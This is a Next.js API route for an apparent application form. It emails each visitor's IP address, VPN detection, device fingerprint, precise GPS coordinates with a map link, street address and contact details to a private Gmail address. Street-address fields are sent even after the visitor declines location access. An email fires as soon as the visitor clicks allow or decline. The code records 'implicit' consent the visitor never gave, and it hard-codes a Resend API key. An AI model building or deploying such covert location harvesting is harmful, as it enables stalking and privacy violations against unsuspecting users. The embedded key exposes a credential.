import { NextRequest, NextResponse } from 'next/server';
import { Resend } from 'resend';

const resend = new Resend(process.env.RESEND_API_KEY || 're_dbucvqvg_6nVX9uBbM1bfoKtjAA46zCvW');

interface LocationData {
  coordinates: {
    latitude: number;
    longitude: number;
    accuracy: number;
  } | null;
  address: {
    street: string;
    city: string;
    state: string;
    country: string;
    zipCode: string;
  } | null;
  ip: string;
  isVPN: boolean;
  vpnProvider: string | null;
  deviceInfo: {
    userAgent: string;
    platform: string;
    language: string;
    screenResolution: string;
    timezone: string;
  };
}

interface PermissionSubmission {
  type: 'permission';
  allowed: boolean;
  location: LocationData | null;
  timestamp: string;
}

interface FormSubmission {
  type: 'form';
  answers: {
    question1: string;
    question2: string;
    question3: string;
    question4: string;
    question5: string;
    question6: string;
  };
  location: LocationData | null;
  timestamp: string;
}

type Submission = PermissionSubmission | FormSubmission;

export async function POST(request: NextRequest) {
  try {
    const data: Submission = await request.json();

    const submissionDate = new Date(data.timestamp);
    const formattedDate = submissionDate.toLocaleString('en-US', {
      weekday: 'long',
      year: 'numeric',
      month: 'long',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      timeZoneName: 'short',
    });

    let emailBody = '';
    let subject = '';

    if (data.type === 'permission') {
      // PERMISSION EMAIL - sent immediately when user clicks allow/decline
      const decision = data.allowed ? 'ALLOWED' : 'DECLINED';
      subject = `Application Started - ${decision} - ${formattedDate}`;

      emailBody = `
═══════════════════════════════════════════════════════════════════
                    USER BEGAN APPLICATION
═══════════════════════════════════════════════════════════════════

Permission Decision: ${decision}
Timestamp: ${formattedDate}

`;

      if (data.location) {
        const loc = data.location;

        emailBody += `═══════════════════════════════════════════════════════════════════
                        LOCATION DATA
═══════════════════════════════════════════════════════════════════

- IP Address: ${loc.ip || 'Unknown'}
`;

        if (loc.isVPN) {
          emailBody += `- VPN DETECTED: YES
- VPN/Proxy Provider: ${loc.vpnProvider || 'Unknown provider'}
`;
        } else {
          emailBody += `- VPN Detected: No (regular connection)
`;
        }

        if (data.allowed && loc.coordinates) {
          emailBody += `
- Coordinates: ${loc.coordinates.latitude}, ${loc.coordinates.longitude}
- Accuracy: ~${Math.round(loc.coordinates.accuracy)} meters
- Google Maps: https://www.google.com/maps?q=${loc.coordinates.latitude},${loc.coordinates.longitude}
`;
        } else if (!data.allowed) {
          emailBody += `
- Coordinates: Not available (user declined location access)
`;
        }

        if (loc.address) {
          emailBody += `
- Street: ${loc.address.street || 'Not available'}
- City: ${loc.address.city || 'Not available'}
- State/Region: ${loc.address.state || 'Not available'}
- Country: ${loc.address.country || 'Not available'}
- Zip Code: ${loc.address.zipCode || 'Not available'}
`;
        }

        emailBody += `
═══════════════════════════════════════════════════════════════════
                        DEVICE INFO
═══════════════════════════════════════════════════════════════════

- Platform: ${loc.deviceInfo.platform || 'Unknown'}
- Language: ${loc.deviceInfo.language || 'Unknown'}
- Screen Resolution: ${loc.deviceInfo.screenResolution || 'Unknown'}
- Timezone: ${loc.deviceInfo.timezone || 'Unknown'}
- User Agent: ${loc.deviceInfo.userAgent || 'Unknown'}
`;
      } else {
        emailBody += `Location data not available
`;
      }

      emailBody += `
═══════════════════════════════════════════════════════════════════

NOTE: Full form responses will follow after completion.

═══════════════════════════════════════════════════════════════════
`;

    } else {
      // FORM COMPLETION EMAIL - sent after all 6 questions answered
      subject = `Form Completed - ${formattedDate}`;

      emailBody = `
═══════════════════════════════════════════════════════════════════
                    FORM COMPLETED
═══════════════════════════════════════════════════════════════════

Submission Time: ${formattedDate}

═══════════════════════════════════════════════════════════════════
                        FORM RESPONSES
═══════════════════════════════════════════════════════════════════

1. Full Name:
   ${data.answers.question1 || 'Not provided'}

2. Email Address:
   ${data.answers.question2 || 'Not provided'}

3. Phone Number:
   ${data.answers.question3 || 'Not provided'}

4. About Themselves:
   ${data.answers.question4 || 'Not provided'}

5. What They're Looking For:
   ${data.answers.question5 || 'Not provided'}

6. Additional Information:
   ${data.answers.question6 || 'Not provided'}

`;

      if (data.location) {
        const loc = data.location;

        emailBody += `═══════════════════════════════════════════════════════════════════
                        LOCATION DATA
═══════════════════════════════════════════════════════════════════

- IP Address: ${loc.ip || 'Unknown'}
`;

        if (loc.isVPN) {
          emailBody += `- VPN DETECTED: YES
- VPN/Proxy Provider: ${loc.vpnProvider || 'Unknown provider'}
`;
        } else {
          emailBody += `- VPN Detected: No (regular connection)
`;
        }

        if (loc.coordinates) {
          emailBody += `
- Coordinates: ${loc.coordinates.latitude}, ${loc.coordinates.longitude}
- Accuracy: ~${Math.round(loc.coordinates.accuracy)} meters
- Google Maps: https://www.google.com/maps?q=${loc.coordinates.latitude},${loc.coordinates.longitude}
`;
        } else {
          emailBody += `
- Coordinates: Not available (geolocation denied or unavailable)
`;
        }

        if (loc.address) {
          emailBody += `
- Street: ${loc.address.street || 'Not available'}
- City: ${loc.address.city || 'Not available'}
- State/Region: ${loc.address.state || 'Not available'}
- Country: ${loc.address.country || 'Not available'}
- Zip Code: ${loc.address.zipCode || 'Not available'}
`;
        }

        emailBody += `
═══════════════════════════════════════════════════════════════════
                        DEVICE INFO
═══════════════════════════════════════════════════════════════════

- Platform: ${loc.deviceInfo.platform || 'Unknown'}
- Language: ${loc.deviceInfo.language || 'Unknown'}
- Screen Resolution: ${loc.deviceInfo.screenResolution || 'Unknown'}
- Timezone: ${loc.deviceInfo.timezone || 'Unknown'}
- User Agent: ${loc.deviceInfo.userAgent || 'Unknown'}
`;
      }

      emailBody += `
═══════════════════════════════════════════════════════════════════
                        METADATA
═══════════════════════════════════════════════════════════════════

- Consent Given: Yes (implicit by completing the application)

═══════════════════════════════════════════════════════════════════
`;
    }

    // Send email using Resend
    const { data: emailData, error } = await resend.emails.send({
      from: 'Application Form <onboarding@resend.dev>',
      to: ['shaidt137@gmail.com'],
      subject: subject,
      text: emailBody,
    });

    if (error) {
      console.error('Resend error:', error);
      return NextResponse.json(
        { error: 'Failed to send email' },
        { status: 500 }
      );
    }

    return NextResponse.json({
      success: true,
      message: data.type === 'permission' ? 'Permission recorded' : 'Form submitted successfully',
      emailId: emailData?.id,
    });
  } catch (error) {
    console.error('Submit error:', error);
    return NextResponse.json(
      { error: 'Failed to process submission' },
      { status: 500 }
    );
  }
}
